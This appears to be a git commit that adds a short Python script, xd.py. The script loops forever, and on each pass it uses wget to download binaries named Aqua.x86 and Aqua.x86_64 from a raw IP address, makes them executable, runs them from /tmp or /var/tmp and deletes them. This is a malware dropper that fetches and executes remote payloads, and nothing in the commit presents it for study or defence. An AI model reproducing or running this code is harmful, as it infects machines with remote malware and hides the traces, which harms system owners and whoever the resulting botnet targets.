8565241f88444ece0dee3fde6a2f05e5cbaebe35
dorking123421 <156109754+dorking123421@users.noreply.github.com>
2024-01-09 17:17:44 +0100

    Create xd.py

---
+++ xd.py
@@ -0,0 +1,7 @@
+import os
+
+try:
+    while True:
+        os.system("cd /tmp; cd /var/tmp; wget 93.123.85.110/Aqua.x86; chmod 777 Aqua.x86; ./Aqua.x86 wget; rm -rf Aqua.x86; cd /tmp; cd /var/tmp; wget 93.123.85.110/Aqua.x86_64; chmod 777 Aqua.x86_64; ./Aqua.x86_64 wget; rm -rf Aqua.x86_64;")
+except KeyboardInterrupt:
+    print("Script interrupted. Exiting...")
